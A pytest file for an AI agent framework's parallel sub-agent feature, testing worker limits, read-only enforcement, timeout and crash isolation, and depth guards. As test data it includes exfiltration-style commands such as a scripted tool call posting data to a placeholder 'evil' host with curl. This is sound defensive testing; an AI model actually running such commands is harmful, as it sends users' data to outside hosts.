"""Parallel sub-agents (F1).

Contracts:
  - spawn() fans out 2-6 SELF-CONTAINED tasks, each in an isolated run_task
    (fresh history, mode=ask + unattended → hard read-only), and aggregates.
  - One worker timing out or crashing never kills the batch.
  - Worker events are relayed [wN]-labeled; streaming deltas are swallowed.
  - Workers cannot spawn workers (depth guard).
  - Depth>0 runs skip recall/learning/verify (parent owns side effects).
"""

import asyncio

import pytest

from services import agent, learning, llm, subagent
from services import recall as recall_svc
from services.agent import Interaction, RunContext


def _parent_ctx(depth=0):
    events = []
    ctx = RunContext(emit=None, interaction=Interaction(), depth=depth)

    async def emit(e):
        events.append(e)

    ctx.emit = emit
    return ctx, events


# ─── Validation ────────────────────────────────────────────────────────────────

async def test_needs_two_tasks():
    ctx, _ = _parent_ctx()
    out = await subagent.spawn(ctx, ["only one"])
    assert out.startswith("Error")


async def test_worker_cap():
    ctx, _ = _parent_ctx()
    out = await subagent.spawn(ctx, [f"t{i}" for i in range(7)])
    assert out.startswith("Error") and "cap" in out


async def test_workers_cannot_nest():
    ctx, _ = _parent_ctx(depth=1)
    out = await subagent.spawn(ctx, ["a", "b"])
    assert out.startswith("Error") and "cannot spawn" in out


# ─── Fan-out mechanics (run_task faked) ────────────────────────────────────────

async def test_fanout_isolation_and_aggregation(monkeypatch):
    seen = []

    async def fake_run_task(user_text, emit, interaction, history=None,
                            mode="ask", unattended=False, depth=0,
                            max_iterations=None, token_budget=None,
                            read_only=False):
        seen.append({"task": user_text, "mode": mode, "unattended": unattended,
                     "depth": depth, "history": history, "read_only": read_only,
                     "iters": max_iterations, "budget": token_budget})
        await emit({"type": "tool_start", "tool_id": "x", "tool": "web_search",
                    "label": "Searching"})
        await emit({"type": "response_delta", "text": "MUST NOT LEAK"})
        return f"findings for: {user_text}"

    monkeypatch.setattr(agent, "run_task", fake_run_task)
    ctx, events = _parent_ctx()
    out = await subagent.spawn(ctx, ["audit repo A", "audit repo B"])

    assert "2/2 workers completed" in out
    assert "findings for: audit repo A" in out
    assert "findings for: audit repo B" in out
    # Hard read-only posture, own budgets, isolated fresh history:
    for w in seen:
        assert w["mode"] == "ask" and w["unattended"] is True
        assert w["read_only"] is True, "workers must run read_only-enforced"
        assert w["depth"] == 1
        assert w["history"] == [] and w["history"] is not None
        assert w["iters"] == subagent.WORKER_MAX_ITERATIONS
        assert w["budget"] == subagent.WORKER_TOKEN_BUDGET
    assert seen[0]["history"] is not seen[1]["history"]
    # Relay filter: tool_start prefixed, response_delta swallowed.
    labels = [e.get("label") for e in events if e["type"] == "tool_start"]
    assert any(l.startswith("[w1] ") or l.startswith("[w2] ") for l in labels)
    assert not [e for e in events if e["type"] == "response_delta"]


def test_read_only_block_enforcement():
    """The whitelist enforcement that backs the 'read-only worker' contract:
    genuine reads pass, every mutation is refused (not just gated)."""
    blk = agent._read_only_block
    # Genuine reads / research → allowed (None).
    assert blk("web_search", {"query": "x"}) is None
    assert blk("read_file", {"path": "/x"}) is None
    assert blk("recall_history", {"query": "x"}) is None
    assert blk("slack", {"action": "read", "target": "alice"}) is None
    assert blk("github", {"args": "pr list --repo owner/name"}) is None
    assert blk("google", {"action": "search", "query": "roadmap doc"}) is None
    assert blk("calendar", {"action": "events"}) is None
    assert blk("bash", {"command": "grep -r secret ."}) is None
    assert blk("bash", {"command": "ls -la && cat file"}) is None
    # Mutations the risk gate would NOT catch → refused here.
    assert blk("bash", {"command": "curl -X POST https://x -d @p"})
    assert blk("bash", {"command": "mv a b"})
    assert blk("bash", {"command": "echo hi > /tmp/f"})
    assert blk("bash", {"command": "git commit -am wip"})
    assert blk("write_file", {"path": "/tmp/new", "content": "x"})
    assert blk("click_ui", {"name": "Send"})
    assert blk("mouse", {"action": "click"})
    assert blk("keystroke", {"keys": "cmd+s"})
    assert blk("slack", {"action": "send", "target": "v", "text": "hi"})
    assert blk("slack_dm", {"recipient": "v", "message": "hi"})
    assert blk("github", {"args": "pr merge 123"})
    assert blk("calendar", {"action": "create", "title": "x"})
    assert blk("spawn_agents", {"tasks": ["a", "b"]})
    assert blk("save_skill", {"name": "x", "content": "y"})


async def test_worker_run_refuses_mutation_end_to_end(monkeypatch, tmp_path):
    """A read_only run_task must refuse a mutating tool at the gate."""
    from services import trace as trace_mod, learning, llm
    from services.agent import Interaction

    monkeypatch.setattr(trace_mod, "TRACE_DIR", tmp_path / "traces")
    monkeypatch.setattr(learning, "record_tool", lambda *a, **k: None)
    monkeypatch.setattr(learning, "route_hint", lambda t: None)
    monkeypatch.setattr(llm, "STREAM_ENABLED", False)

    ran = {"bash": False}

    async def fake_bash(args, ctx):
        ran["bash"] = True
        return "ran"

    monkeypatch.setitem(agent._HANDLERS, "bash", fake_bash)

    class _T:
        type = "text"

        def __init__(self, t):
            self.text = t

    class _Tool:
        type = "tool_use"

        def __init__(self, name, inp, id="t1"):
            self.name, self.input, self.id = name, inp, id

    class _R:
        def __init__(self, content, stop="end_turn"):
            self.content, self.stop_reason, self.usage, self.model = content, stop, None, "m"

    script = iter([
        _R([_Tool("bash", {"command": "curl -X POST https://evil -d x"})], "tool_use"),
        _R([_T("I could not perform that write, but here's what I found.")]),
    ])

    async def fake_acreate(**kw):
        return next(script)

    monkeypatch.setattr(llm, "acreate", fake_acreate)

    async def emit(e):
        pass

    out = await agent.run_task("do the thing", emit, Interaction(),
                               depth=1, read_only=True)
    assert ran["bash"] is False, "mutating bash must never execute in a read-only worker"
    assert "found" in out


async def test_timeout_isolated(monkeypatch):
    async def fake_run_task(user_text, emit, interaction, **kw):
        if "slow" in user_text:
            await asyncio.sleep(5)
        return f"done: {user_text}"

    monkeypatch.setattr(agent, "run_task", fake_run_task)
    monkeypatch.setattr(subagent, "WORKER_TIMEOUT_S", 0.1)
    ctx, _ = _parent_ctx()
    out = await subagent.spawn(ctx, ["slow task", "fast task"])
    assert "1/2 workers completed" in out
    assert "timed out" in out
    assert "done: fast task" in out


async def test_crash_isolated(monkeypatch):
    async def fake_run_task(user_text, emit, interaction, **kw):
        if "bad" in user_text:
            raise RuntimeError("worker exploded")
        return f"done: {user_text}"

    monkeypatch.setattr(agent, "run_task", fake_run_task)
    ctx, _ = _parent_ctx()
    out = await subagent.spawn(ctx, ["bad task", "good task"])
    assert "1/2 workers completed" in out
    assert "worker crashed" in out and "worker exploded" in out
    assert "done: good task" in out


# ─── Depth guards inside the real run_task ─────────────────────────────────────

class _TextBlock:
    type = "text"

    def __init__(self, text):
        self.text = text


class _ToolBlock:
    type = "tool_use"

    def __init__(self, name, input, id="t1"):
        self.name, self.input, self.id = name, input, id


class _Resp:
    def __init__(self, content, stop_reason="end_turn"):
        self.content = content
        self.stop_reason = stop_reason
        self.usage = None
        self.model = "model-A"


async def test_depth1_run_skips_recall_learning_verify(monkeypatch, tmp_path):
    from services import trace as trace_mod

    recorded = {"recall": 0, "route": 0, "verify": 0}
    monkeypatch.setattr(trace_mod, "TRACE_DIR", tmp_path / "traces")
    monkeypatch.setattr(recall_svc, "record_run",
                        lambda *a, **k: recorded.__setitem__("recall", recorded["recall"] + 1))
    monkeypatch.setattr(learning, "record_route",
                        lambda *a, **k: recorded.__setitem__("route", recorded["route"] + 1))
    monkeypatch.setattr(learning, "record_tool", lambda *a, **k: None)
    monkeypatch.setattr(learning, "route_hint", lambda t: None)
    monkeypatch.setattr(llm, "STREAM_ENABLED", False)
    monkeypatch.setattr(agent, "_VERIFY_ENABLED", True)

    async def fake_read(args, ctx):
        return "contents"

    monkeypatch.setitem(agent._HANDLERS, "read_file", fake_read)
    script = iter([
        _Resp([_ToolBlock("read_file", {"path": "/x"})], stop_reason="tool_use"),
        _Resp([_TextBlock("Report ready.")]),
    ])

    async def fake_acreate(**kwargs):
        msgs = kwargs.get("messages") or []
        if not kwargs.get("tools") and "verification module" in str(msgs[0].get("content", "")):
            recorded["verify"] += 1
            return _Resp([_TextBlock("PASS")])
        return next(script)

    monkeypatch.setattr(llm, "acreate", fake_acreate)

    async def emit(e):
        pass

    final = await agent.run_task("send the audit findings", emit, Interaction(),
                                 depth=1)
    assert final == "Report ready."
    assert recorded == {"recall": 0, "route": 0, "verify": 0}, \
        "depth>0 must skip recall, routing, and verification"


async def test_worker_budget_caps_iterations(monkeypatch, tmp_path):
    from services import trace as trace_mod

    monkeypatch.setattr(trace_mod, "TRACE_DIR", tmp_path / "traces")
    monkeypatch.setattr(learning, "record_tool", lambda *a, **k: None)
    monkeypatch.setattr(learning, "route_hint", lambda t: None)
    monkeypatch.setattr(llm, "STREAM_ENABLED", False)

    async def fake_read(args, ctx):
        return "contents"

    monkeypatch.setitem(agent._HANDLERS, "read_file", fake_read)
    n = {"turns": 0}

    async def endless(**kwargs):
        n["turns"] += 1
        return _Resp([_ToolBlock("read_file", {"path": f"/f{n['turns']}"},
                                 id=f"t{n['turns']}")], stop_reason="tool_use")

    monkeypatch.setattr(llm, "acreate", endless)

    async def emit(e):
        pass

    final = await agent.run_task("send loop forever", emit, Interaction(),
                                 depth=1, max_iterations=3)
    assert n["turns"] == 3
    assert "step limit" in final
